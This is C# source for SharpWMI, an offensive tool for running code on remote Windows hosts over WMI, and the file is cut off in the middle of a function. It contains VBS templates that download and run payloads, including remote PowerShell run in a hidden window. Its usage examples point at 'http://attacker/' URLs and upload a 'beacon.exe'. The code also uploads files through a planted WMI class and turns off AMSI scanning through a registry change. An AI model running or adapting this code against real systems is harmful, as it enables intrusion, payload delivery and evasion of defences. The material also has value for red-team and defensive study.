using System;
using System.CodeDom;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Security.Cryptography;
using System.Security.Policy;
using System.Text;
using System.Threading;

namespace SharpWMI
{
    class Program
    {
        private static string TemplateVBSCommand = @"
command = ""COMMAND""
computer = "".""

Set wmi = GetObject(""winmgmts:{impersonationLevel=impersonate}!\\"" _
        & computer & ""\root\cimv2"")

Set startup = wmi.Get(""Win32_ProcessStartup"")
Set conf = startup.SpawnInstance_
conf.ShowWindow = 12

Set proc = GetObject(""winmgmts:root\cimv2:Win32_Process"")
proc.Create command, Null, conf, intProcessID
";

        private static string TemplateVBSDownloadAndExec = @"
downloadURL = ""DOWNLOAD_URL""
saveAs = ""TARGET_FILE""
cmd = ""COMMAND""

Dim sh: Set sh = CreateObject(""WScript.Shell"")
out = sh.ExpandEnvironmentStrings(saveAs)

Dim xhr: Set xhr = CreateObject(""Msxml2.ServerXMLHTTP"")
xhr.Open ""GET"", downloadURL, False
xhr.Send

If xhr.Status = 200 Then
    With CreateObject(""Adodb.Stream"")
        .Open
        .Type = 1
        .write xhr.responseBody
        .savetofile out, 2
    End With

    If IsNull(cmd) Or Len(cmd) = 0  Then
        cmd = out
    End If
    sh.Run cmd, 0, False
End If

Set sh = Nothing
Set xhr = Nothing
";

        private static string TemplateVBSDownloadPSAndExec = @"
scriptURL = ""DOWNLOAD_URL""
launcher = ""powershell -nop -w hid -Command -""

Dim xhr: Set xhr = CreateObject(""MSXML2.XMLHTTP"")
xhr.Open ""GET"", scriptURL, False
xhr.Send

Function bin2a(Binary)
    Dim I, S
    For I = 1 to LenB(Binary)
        S = S & Chr(AscB(MidB(Binary, I, 1)))
    Next
    bin2a = S
End Function

If xhr.Status = 200 Then
    With CreateObject(""WScript.Shell"")
        With.Exec(launcher)
            .StdIn.WriteLine bin2a(xhr.responseBody)
            .StdIn.WriteBlankLines 1
            .Terminate
        End With
    End With
End If

Set xhr = Nothing
";

        private static string ExecutionResultVariableName = "_Context##RANDOM##";

        //
        // During file upload we'll need to create a temporary evil WMI class having one property.
        // These variables specify properties of such WMI class to be created.
        //
        private static string FileUploadTempWMIClassName = "Win32_OSRecoveryConfigurationData";
        private static string FileUploadTempWMIPropertyName = "DebugOptions";



        static void Usage()
        {
            Console.WriteLine(@"
:: GhostPack/SharpWMI - a C# implementation of various WMI functionality.

This implementation is a refurbished and enhanced version of original SharpWMI by @harmj0y that adds some more 
flexibility for working with malicious VBS scripts, AMSI evasion, file upload purely via WMI and makes it possible  
to return output from WMI remotely executed commands.

AUTHORS:
  Original SharpWMI written:                    Will Schroeder @harmj0y (https://github.com/GhostPack/SharpWMI)
  Enhancements, VBS flexibility, more actions:  Mariusz B. / mgeeky @mariuszbit
  WMI code-exec output idea:                    Evi1cg @Ridter
  AMSI evasion code taken from SharpMove:       Steven Flores 0xthirteen

USAGE:
  Local system enumeration:        
    SharpWMI.exe action=query query=""select * from win32_service"" [namespace=BLAH]

  Remote system enumeration: 
    SharpWMI.exe action=query [computername=HOST1[,HOST2,...]] query=""select * from win32_service"" [namespace=BLAH]

  Remote system Logged On users enumeration:
    SharpWMI.exe action=loggedon [computername=HOST1[,HOST2,...]]

  Remote process creation: 
    SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]

  Remote VBS execution: 
    SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]

  File upload via WMI:
    SharpWMI.exe action=upload [computername=HOST[,HOST2,...]] source=""C:\\source\\file.exe"" dest=""C:\\temp\\dest-file.exe"" [amsi=disable]

  Remote firewall enumeration :
    SharpWMI.exe action=firewall computername=HOST1[,HOST2,...]

  List processes:
    SharpWMI.exe action=ps [computername=HOST[,HOST2,...]]

  Terminate process (first found):
    SharpWMI.exe action=terminate process=PID|name [computername=HOST[,HOST2,...]]

  Get environment variables (all if name not given):
    SharpWMI.exe action=getenv [name=VariableName] [computername=HOST[,HOST2,...]]

  Set environment variable
    SharpWMI.exe action=setenv name=VariableName value=VariableValue [computername=HOST[,HOST2,...]]

  Delete an environment variable
    SharpWMI.exe action=delenv name=VariableName [computername=HOST[,HOST2,...]]

NOTE: 
  - Any remote function also takes an optional ""username=DOMAIN\\user"" ""password=Password123!"".
  - If computername is not specified, will target localhost.

VBS Script execution:
  The 'executevbs' action was reworked as compared to the original version of SharpWMI. 
  Script specification defined in [script-specification] offers following methods to point this tool at target VBS code:

  A) Executes OS command via preset VBS code: 
    SharpWMI.exe action=executevbs [...] command=""notepad.exe"" 

  B) Downloads Powershell commands from URL and execute them from within VBS via Powershell's StdIn: 
    SharpWMI.exe action=executevbs [...] url=""http://attacker/myscript.ps1"" 

  C) Download a binary file from given URL, store it in specified path and then execute it: 
                                         url=""SOURCE_URL,TARGET_PATH""
    SharpWMI.exe action=executevbs [...] url=""http://attacker/foo.png,%TEMP%\bar.exe"" 

  D) Download a binary file from given URL, store it in specified path and then execute arbitrary command: 
                                         url=""SOURCE_URL,TARGET_PATH""
    SharpWMI.exe action=executevbs [...] url=""http://attacker/foo.png,%TEMP%\bar.exe"" command=""%TEMP%\bar.exe -some -parameters""

  E) Read VBS script from file and execute it: 
    SharpWMI.exe action=executevbs [...] script=""myscript.vbs"" 

  F) Execute given VBS script given literally:
    SharpWMI.exe action=executevbs [...] script=""CreateObject(\\""WScript.Shell\\"").Run(\\""notepad.exe\\"")"" 

  G) Base64 decode input string being encoded VBS script and execute it on remote machine: 
    SharpWMI.exe action=executevbs [...] scriptb64=""Q3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIi[...]"" 

  H) Read contents of given file, base64 decode them and then execute on target machine: 
    SharpWMI.exe action=executevbs [...] scriptb64=""myscript.vbs.b64"" 

  Finally, 'executevbs' action may have additional [time-specs] defined in seconds - they specify script trigger and wait timeouts:
    SharpWMI.exe action=executevbs [...] trigger=5 timeout=10


EXAMPLES:

  SharpWMI.exe action=query query=""select * from win32_process""

  SharpWMI.exe action=query query=""SELECT * FROM AntiVirusProduct"" namespace=""root\\SecurityCenter2""

  SharpWMI.exe action=loggedon computername=primary.testlab.local

  SharpWMI.exe action=query computername=primary.testlab.local query=""select * from win32_service""

  SharpWMI.exe action=query computername=primary,secondary query=""select * from win32_process""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""powershell.exe -enc ZQBj...""

  SharpWMI.exe action=exec computername=primary.testlab.local command=""whoami"" result=true amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local command=""notepad.exe"" eventname=""MyLittleEvent"" amsi=disable

  SharpWMI.exe action=executevbs computername=primary.testlab.local username=""TESTLAB\\harmj0y"" password=""Password123!""

  SharpWMI.exe action=upload computername=primary.testlab.local source=""beacon.exe"" dest=""C:\\Windows\\temp\\foo.exe"" amsi=disable

  SharpWMI.exe action=terminate computername=primary.testlab.local process=explorer

  SharpWMI.exe action=getenv name=PATH computername=primary.testlab.local

  SharpWMI.exe action=setenv name=FOO value=""BAR"" computername=primary.testlab.local

  SharpWMI.exe action=delenv name=FOO computername=primary.testlab.local
");
        }

        // helper used to wrap long output
        public static System.Collections.Generic.IEnumerable<string> Split(string text, int partLength)
        {
            if (text == null) { throw new ArgumentNullException("singleLineString"); }

            if (partLength < 1) { throw new ArgumentException("'columns' must be greater than 0."); }

            var partCount = Math.Ceiling((double)text.Length / partLength);
            if (partCount < 2)
            {
                yield return text;
            }

            for (int i = 0; i < partCount; i++)
            {
                var index = i * partLength;
                var lengthLeft = Math.Min(partLength, text.Length - index);
                var line = text.Substring(index, lengthLeft);
                yield return line;
            }
        }

        static void LocalWMIQuery(string wmiQuery, string wmiNameSpace = "")
        {
            ManagementObjectSearcher wmiData = null;

            try
            {
                if (String.IsNullOrEmpty(wmiNameSpace))
                {
                    wmiData = new ManagementObjectSearcher(wmiQuery);
                }
                else
                {
                    wmiData = new ManagementObjectSearcher(wmiNameSpace, wmiQuery);
                }

                ManagementObjectCollection data = wmiData.Get();
                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        string propValue = String.Format("{0}", prop.Value);

                        // wrap long output to 80 lines
                        if (!String.IsNullOrEmpty(propValue) && (propValue.Length > 90))
                        {
                            bool header = false;
                            foreach (string line in Split(propValue, 80))
                            {
                                if (!header)
                                {
                                    Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, line));
                                }
                                else
                                {
                                    Console.WriteLine(String.Format("{0,30}   {1}", "", line));
                                }
                                header = true;
                            }
                        }
                        else
                        {
                            Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                        }
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception {0}", ex.Message));
            }
        }

        static List<Dictionary<string, string>> GetWMIQueryResults(string host, string wmiQuery, string wmiNameSpace, string username, string password)
        {
            if (wmiNameSpace == "")
            {
                wmiNameSpace = "root\\cimv2";
            }

            var output = new List<Dictionary<string, string>>();

            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);
            Console.WriteLine("  Query: \"{0}\"\r\n", wmiQuery);

            if (!String.IsNullOrEmpty(username))
            {
                options.Username = username;
                options.Password = password;
            }

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    Dictionary<string, string> entry = new Dictionary<string, string>();

                    foreach (System.Management.PropertyData prop in props)
                    {
                        entry[prop.Name] = (string)Convert.ChangeType(prop.Value, typeof(string));
                    }

                    output.Add(entry);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] WMI Exception ({0}): {1}", wmiQuery, ex.Message));
                return null;
            }

            return output;
        }

        static void GetLoggedOnUsers(string computerName, string username, string password)
        {
            var loggedOns = GetWMIQueryResults(computerName, "SELECT * FROM Win32_LoggedOnUser", null, username, password);
            if(loggedOns == null || loggedOns.Count == 0)
            {
                Console.WriteLine("\r\nCould not retrieve list of logged on users on {0}", computerName);
                return;
            }

            var uniqUsers = new HashSet<string>();

            foreach (var entry in loggedOns)
            {
                string ant = entry["Antecedent"];
                if (ant.IndexOf("DWM-") != -1 || ant.IndexOf("UMFD-") != -1) continue;

                string domainPrefix = "Domain=\"", userPrefix = "\",Name=\"";
                var pos = ant.IndexOf(domainPrefix);

                if (pos != -1)
                {
                    string d, u;
                    var pos2 = ant.IndexOf('"', pos + domainPrefix.Length);
                    var pos3 = ant.IndexOf(userPrefix);
                    if (pos2 != -1 && pos3 != -1)
                    {
                        d = ant.Substring((pos + domainPrefix.Length), pos3 - (pos + domainPrefix.Length));
                        u = ant.Substring((pos3 + userPrefix.Length), ant.Length - (pos3 + userPrefix.Length) - 1);
                        ant = String.Format(@"{0}\{1}", d, u);
                    }
                }

                if (!uniqUsers.Contains(ant))
                {
                    Console.WriteLine("{0,-15}: {1}", computerName, ant);
                    uniqUsers.Add(ant);
                }
            }
        }

        static void RemoteWMIFirewall(string host, string username, string password)
        {
            string wmiNameSpace = "ROOT\\StandardCIMV2";

            ConnectionOptions options = new ConnectionOptions();

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            Dictionary<string, ArrayList> firewallRules = new Dictionary<string, ArrayList>();

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery("SELECT Enabled,DisplayName,Action,Direction,InstanceID from MSFT_NetFirewallRule WHERE Enabled=1");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;

                    string instanceID = props["InstanceID"].Value.ToString();

                    ArrayList ruleData = new ArrayList();
                    ruleData.Add(props["DisplayName"].Value.ToString());
                    ruleData.Add(props["Action"].Value.ToString());
                    ruleData.Add(props["Direction"].Value.ToString());

                    firewallRules[instanceID] = ruleData;
                }

                ObjectQuery query2 = new ObjectQuery("SELECT InstanceID,LocalPort from MSFT_NetProtocolPortFilter WHERE Protocol='TCP'");
                ManagementObjectSearcher searcher2 = new ManagementObjectSearcher(scope, query2);
                ManagementObjectCollection data2 = searcher2.Get();
                foreach (ManagementObject result in data2)
                {
                    System.Management.PropertyDataCollection props = result.Properties;

                    if ((props["LocalPort"].Value != null))
                    {
                        string instanceID = props["InstanceID"].Value.ToString();
                        if (firewallRules.ContainsKey(instanceID))
                        {
                            string[] localPorts = (string[])props["LocalPort"].Value;

                            Console.WriteLine("Rulename   : {0}", firewallRules[instanceID][0]);
                            if (firewallRules[instanceID][1].ToString() == "2")
                            {
                                Console.WriteLine("Action     : {0} (Allow)", firewallRules[instanceID][1]);
                            }
                            else if (firewallRules[instanceID][1].ToString() == "3")
                            {
                                Console.WriteLine("Action     : {0} (AllowBypass)", firewallRules[instanceID][1]);
                            }
                            else if (firewallRules[instanceID][1].ToString() == "4")
                            {
                                Console.WriteLine("Action     : {0} (Block)", firewallRules[instanceID][1]);
                            }
                            else
                            {
                                Console.WriteLine("Action     : {0} (Unknown)", firewallRules[instanceID][1]);
                            }

                            if (firewallRules[instanceID][2].ToString() == "1")
                            {
                                Console.WriteLine("Direction  : {0} (Inbound)", firewallRules[instanceID][2]);
                            }
                            else if (firewallRules[instanceID][2].ToString() == "2")
                            {
                                Console.WriteLine("Direction  : {0} (Outbound)", firewallRules[instanceID][2]);
                            }
                            else
                            {
                                Console.WriteLine("Direction  : {0} (Unknown)", firewallRules[instanceID][2]);
                            }

                            Console.WriteLine("LocalPorts : {0}\n", localPorts);
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("  Exception : {0}", ex.Message));
            }
        }

        static void TerminateProcesses(string process, string computerName, string username, string password)
        {
            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, computerName, username, password, "root\\cimv2");
            if (r.Length > 0)
            {
                throw new Exception(r);
            }

            try
            {
                ObjectQuery query;
                int pid = 0;
                if(Int32.TryParse(process, out pid))
                {
                    query = new ObjectQuery(string.Format("select * from Win32_Process where ProcessId = {0}", pid));
                }
                else
                {
                    query = new ObjectQuery(string.Format("select * from Win32_Process where Name like '%{0}%'", process));
                }
                
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                foreach (ManagementObject proc in searcher.Get())
                {
                    object ret = proc.InvokeMethod("Terminate", null);
                    Console.WriteLine(string.Format("[+] Attempted to terminate remote process ({0}). Returned: {1}", process, ret));
                }

                Console.WriteLine(string.Format("[x] Process {0} not found", process));
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("[!] Could not retrieve remote processes to terminate! Exception: {0}", ex.ToString()));
            }
        }

        static void GetProcesses(string computerName, string username, string password)
        {
            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, computerName, username, password, "root\\cimv2");
            if (r.Length > 0)
            {
                throw new Exception(r);
            }

            try
            {
                var wmiProcess = new ManagementClass(scope, new ManagementPath("Win32_Process"), new ObjectGetOptions());

                ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_Process");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    var ps = new Dictionary<string, string>();

                    ps["ProcessId"] = result.GetPropertyValue("ProcessId")?.ToString();
                    ps["Name"] = result.GetPropertyValue("Name")?.ToString();
                    ps["CommandLine"] = result.GetPropertyValue("CommandLine")?.ToString();
                    ps["Owner"] = "";

                    string[] argList = new string[] { string.Empty, string.Empty };
                    try
                    {
                        int returnVal = Convert.ToInt32(result.InvokeMethod("GetOwner", argList));
                        if (returnVal == 0)
                        {
                            ps["Owner"] = String.Format(@"{0}\{1}", argList[1]?.ToString(), argList[0]?.ToString());
                        }
                    }
                    catch 
                    { 
                    }

                    Console.WriteLine("{0,6} | {1,30} | {2, 25} | {3}", ps["ProcessId"], ps["Name"], ps["Owner"], ps["CommandLine"]);
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("[!] Could not retrieve remote processes list! Exception: {0}", ex.ToString()));
            }
        }

        static void RemoteWMIQuery(string host, string wmiQuery, string wmiNameSpace, string username, string password)
        {
            if (wmiNameSpace == "")
            {
                wmiNameSpace = "root\\cimv2";
            }

            ConnectionOptions options = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            Console.WriteLine("\r\n  Scope: \\\\{0}\\{1}", host, wmiNameSpace);

            if (!String.IsNullOrEmpty(username))
            {
                Console.WriteLine("  User credentials: {0}", username);
                options.Username = username;
                options.Password = password;
            }
            Console.WriteLine();

            ManagementScope scope = new ManagementScope(String.Format("\\\\{0}\\{1}", host, wmiNameSpace), options);

            try
            {
                scope.Connect();

                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                Console.WriteLine();

                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        Console.WriteLine(String.Format("{0,30} : {1}", prop.Name, prop.Value));
                    }
                    Console.WriteLine();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[X] Exception : {0}", ex.Message));
            }
        }

        private static List<Dictionary<string, string>> GetWMIQueryResultsList(string host, string user, string password, string wmiQuery, string wmiNamespace)
        {
            var output = new List<Dictionary<string, string>>();

            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, host, user, password, wmiNamespace);
            if (r.Length > 0)
            {
                throw new Exception(r);
            }

            try
            {
                ObjectQuery query = new ObjectQuery(wmiQuery);
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();

                if (data != null)
                {
                    foreach (ManagementObject result in data)
                    {
                        System.Management.PropertyDataCollection props = result.Properties;
                        Dictionary<string, string> entry = new Dictionary<string, string>();

                        foreach (System.Management.PropertyData prop in props)
                        {
                            entry[prop.Name] = (string)Convert.ChangeType(prop.Value, typeof(string));
                        }

                        output.Add(entry);
                    }
                }
            }
            catch (Exception ex)
            {
                throw;
            }

            return output;
        }

        private static string ConnectToWMI(ref ManagementScope scope, string host, string user, string password, string wmiNamespace)
        {
            ConnectionOptions connOptions = new ConnectionOptions
            {
                Impersonation = ImpersonationLevel.Impersonate,
                Authentication = AuthenticationLevel.PacketPrivacy,
                EnablePrivileges = true,
            };

            if (!String.IsNullOrEmpty(user) && !String.IsNullOrEmpty(password))
            {
                connOptions.Username = user;
                connOptions.Password = password;
            }

            if (String.IsNullOrEmpty(wmiNamespace))
            {
                wmiNamespace = "root\\cimv2";
            }

            string fullNamespace;

            if (!String.IsNullOrEmpty(host))
            {
                fullNamespace = String.Format(@"\\{0}\{1}", host, wmiNamespace);
            }
            else
            {
                fullNamespace = String.Format(@"\\.\{0}", wmiNamespace);
            }

            try
            {
                scope = new ManagementScope(fullNamespace, connOptions);
                scope.Connect();
            }
            catch (UnauthorizedAccessException)
            {
                return String.Format("Username: {0} with Password {1} threw an unauthorised exception\n", user, password);
            }
            catch (Exception e)
            {
                return String.Format("[!] WMI connection failed: {0}", e.Message);
            }

            if (scope == null)
                return "[!] Could not reach to remote RPC Server. Check your IP address";

            return "";
        }

        static string GetWMIResultProperty(ManagementScope scope, string varName, string userName)
        {
            //var result = GetWmiProperty(scope, "Win32_Environment", "VariableValue", String.Format("Name='{0}' AND UserName='{1}'", varName, userName));
            var result = GetWmiProperty(scope, "Win32_Environment", "VariableValue", String.Format("Name='{0}'", varName));
            return result;
        }

        static string ResetWMIResultProperty(ManagementScope scope, string varName, string userName)
        {
            if (!String.IsNullOrEmpty(varName))
            {
                try
                {
                    return DelEnvVar(scope, varName, userName);
                }
                catch (Exception ex2)
                {
                    return String.Format("[!] Could not remove an environment variable with command results named {0}: {1}", varName, ex2.Message);
                }
            }

            return "";
        }

        static string GetWmiProperty(ManagementScope scope, string className, string propertyName, string where = null)
        {
            string wmiQuery = String.Format(@"SELECT {0} FROM {1}", propertyName, className);
            if (where != null)
            {
                // WQL Injection ^.^
                wmiQuery += " WHERE " + where;
            }

            try
            {
                ObjectQuery query = new ObjectQuery(wmiQuery);
                string WMIProperty = "";
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(scope, query);
                ManagementObjectCollection data = searcher.Get();
                foreach (ManagementObject result in data)
                {
                    System.Management.PropertyDataCollection props = result.Properties;
                    foreach (System.Management.PropertyData prop in props)
                    {
                        if (String.Compare(prop.Name, propertyName, StringComparison.OrdinalIgnoreCase) == 0)
                        {
                            WMIProperty = prop.Value.ToString();
                            if (!String.IsNullOrEmpty(WMIProperty)) return WMIProperty;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("[!] Could not retrieve WMI property value using query: '{0}'! Exception: {1}", wmiQuery, ex.ToString()));
            }

            return "";
        }

        public static void GetEnvVar(string variableName, string host, string user, string password)
        {
            if (String.IsNullOrEmpty(variableName))
            {
                RemoteWMIQuery(host, "select Name,VariableValue,UserName From Win32_Environment", "root\\cimv2", user, password);
                return;
            }

            if (variableName.IndexOf(",") != -1)
            {
                StringBuilder output = new StringBuilder();
                foreach (var varName in variableName.Split(','))
                {
                    RemoteWMIQuery(host, String.Format("select Name,VariableValue,UserName From Win32_Environment WHERE Name='{0}'", varName), "root\\cimv2", user, password);
                }

                return;
            }

            RemoteWMIQuery(host, String.Format("select Name,VariableValue,UserName From Win32_Environment WHERE Name='{0}'", variableName), "root\\cimv2", user, password);
        }

        private static void SetEnvVarValue(string varName, string value, string host, string user, string password)
        {
            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, host, user, password, "root\\cimv2");
            if (r.Length > 0)
            {
                Console.WriteLine(r);
                return;
            }

            try
            {
                string userName = "";

                if (!String.IsNullOrEmpty(user))
                {
                    userName = String.Format("{0}\\{1}", GetWmiProperty(scope, "Win32_ComputerSystem", "Name"), user);
                }
                else
                {
                    userName = GetWmiProperty(scope, "Win32_ComputerSystem", "UserName");
                }

                Console.WriteLine(SetEnvVarValue(scope, varName, value, userName));
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[!] Could not set variable over WMI: {0}", ex.Message));
            }
        }

        private static string SetEnvVarValue(ManagementScope scope, string varName, string value, string userName)
        {
            StringBuilder results = new StringBuilder();

            bool found = false;
            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_Environment"), null);

            try
            {
                var variables = configClass.GetInstances();
                foreach (ManagementObject envvar in variables)
                {
                    string name = (string)envvar.GetPropertyValue("Name");
                    if (String.IsNullOrEmpty(name)) continue;

                    if (String.Compare(name, varName, StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        //Console.WriteLine("[.] Overridding an environment variable: {0} = \"{1}\"", variable, value);

                        envvar.SetPropertyValue("VariableValue", value.Trim());
                        envvar.SetPropertyValue("UserName", userName);
                        envvar.Put();
                        found = true;
                        break;
                    }
                }

                if (!found)
                {
                    //Console.WriteLine("[.] Setting a new environment variable on: {0} = \"{1}\"", variable, value);

                    ManagementObject mo = configClass.CreateInstance();
                    mo["Name"] = varName;
                    mo["UserName"] = userName;
                    mo["VariableValue"] = value.Trim();
                    mo.Put();
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("[!] Could not set variable over WMI ({0}: {1} = '{2}'):    {3}", userName, varName, value, ex.ToString()));
            }

            return results.ToString();
        }

        private static void DelEnvVar(string varName, string host, string user, string password)
        {
            var scope = new ManagementScope();
            string r = ConnectToWMI(ref scope, host, user, password, "root\\cimv2");
            if (r.Length > 0)
            {
                Console.WriteLine(r);
                return;
            }

            string userName = "";

            try
            {
                if (!String.IsNullOrEmpty(user))
                {
                    userName = String.Format("{0}\\{1}", GetWmiProperty(scope, "Win32_ComputerSystem", "Name"), user);
                }
                else
                {
                    userName = GetWmiProperty(scope, "Win32_ComputerSystem", "UserName");
                }

                Console.WriteLine(DelEnvVar(scope, varName, userName));
            }
            catch (Exception ex)
            {
                Console.WriteLine(String.Format("[!] Could not set variable over WMI: {0}", ex.Message));
            }
        }

        private static string DelEnvVar(ManagementScope scope, string varName, string userName)
        {
            StringBuilder results = new StringBuilder();
            ManagementClass configClass = new ManagementClass(scope, new ManagementPath("Win32_Environment"), null);

            try
            {
                var variables = configClass.GetInstances();
                foreach (ManagementObject envvar in variables)
                {
                    string name = (string)envvar.GetPropertyValue("Name");
                    if (String.IsNullOrEmpty(name)) continue;

                    string varUserName = (string)envvar.GetPropertyValue("UserName");
                    if (String.IsNullOrEmpty(varUserName)) continue;

                    if (String.Compare(name, varName, StringComparison.OrdinalIgnoreCase) == 0 &&
                        String.Compare(varUserName, userName, StringComparison.OrdinalIgnoreCase) == 0)
                    {
                        //results.AppendFormat("[.] Removing variable from {0} environment: {1}", userName, name);
                        envvar.Delete();
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                throw new Exception(String.Format("[!] Could not remove variable over WMI ({0}: {1}):    {2}\r\n", userName, varName, ex.ToString()));
            }

            return results.ToString();
        }

        //
        // These two methods - SetRegKey and UnsetRegKey were written by Steven Flores (0xthirteen) in his SharpMove.
        // All credits goes to Steven.
        // Source: 
        //    https://github.com/0xthirteen/SharpMove/blob/master/SharpMove/SharpMove/Program.cs
        //

        static List<ManagementBaseObject> SetRegKey(ManagementScope scope)
        {
            List<ManagementBaseObject> originalstate = new List<ManagementBaseObject>();
            try
            {
                ManagementClass reg = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                ManagementBaseObject inParams = reg.GetMethodParameters("EnumKey");
                inParams["hDefKey"] = 0x80000001;
                inParams["sSubKeyName"] = "Software\\Microsoft\\Windows Script";
                ManagementBaseObject outParams = reg.InvokeMethod("EnumKey", inParams, null);

                originalstate.Add(outParams);
                if (outParams.Properties["sNames"].Value == null)
                {
                    Console.WriteLine("[+] Value doesn't exist... Creating");
                    ManagementBaseObject in1 = reg.GetMethodParameters("CreateKey");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    ManagementBaseObject out1 = reg.InvokeMethod("CreateKey", in1, null);
                    Console.WriteLine("[+] Created Windows Script key");

                    ManagementBaseObject in2 = reg.GetMethodParameters("SetDWORDValue");
                    in2["hDefKey"] = 0x80000001;
                    in2["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in2["sValueName"] = "AmsiEnable";
                    in2["uValue"] = "0";
                    ManagementBaseObject out2 = reg.InvokeMethod("SetDWORDValue", in2, null);
                    Console.WriteLine("{+] Created AmsiEnable and set to : 0");
                    originalstate.Add(out2);
                }
                else
                {
                    ManagementBaseObject in1 = reg.GetMethodParameters("GetDWORDValue");
                    in1["hDefKey"] = 0x80000001;
                    in1["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                    in1["sValueName"] = "AmsiEnable";
                    ManagementBaseObject outParams2 = reg.InvokeMethod("GetDWORDValue", in1, null);

                    originalstate.Add(outParams2);
                    if (outParams2.Properties["uValue"].Value != null)
                    {
                        string origval = outParams2.Properties["uValue"].Value.ToString();
                        Console.WriteLine("[+] Original AmsiEnable value : {0}", origval);

                        if (origval != "0")
                        {
                            ManagementBaseObject inParams3 = reg.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
                            inParams3["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                            inParams3["sValueName"] = "AmsiEnable";
                            inParams3["uValue"] = "0";
                            ManagementBaseObject outParams3 = reg.InvokeMethod("SetDWORDValue", inParams3, null);
                            Console.WriteLine("[+] AmsiEnable set to : 0");
                        }
                    }
                    else
                    {
                        ManagementBaseObject inParams4 = reg.GetMethodParameters("SetDWORDValue");
                        inParams4["hDefKey"] = 0x80000001;
                        inParams4["sSubKeyName"] = "Software\\Microsoft\\Windows Script\\Settings";
                        inParams4["sValueName"] = "AmsiEnable";
                        inParams4["uValue"] = "0";
                        ManagementBaseObject outParams4 = reg.InvokeMethod("SetDWORDValue", inParams4, null);
                        Console.WriteLine("[+] Created AmsiEnable and set to : 0");
                    }
                }
                return originalstate;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[X] Exception    : {0}", ex);
                return null;
            }
        }

        static void UnsetRegKey(ManagementScope scope, List<ManagementBaseObject> outParams)
        {
            try
            {
                ManagementClass reg1 = new ManagementClass(scope, new ManagementPath("StdRegProv"), null);
                if (outParams[0].Properties["sNames"].Value != null) // Key did exist
                {
                    if (outParams[1].Properties["uValue"].Value != null)
                    {
                        string originalvalue = outParams[1].Properties["uValue"].Value.ToString();
                        if (originalvalue != "0")
                        {
                            ManagementBaseObject inParams3 = reg1.GetMethodParameters("SetDWORDValue");
                            inParams3["hDefKey"] = 0x80000001;
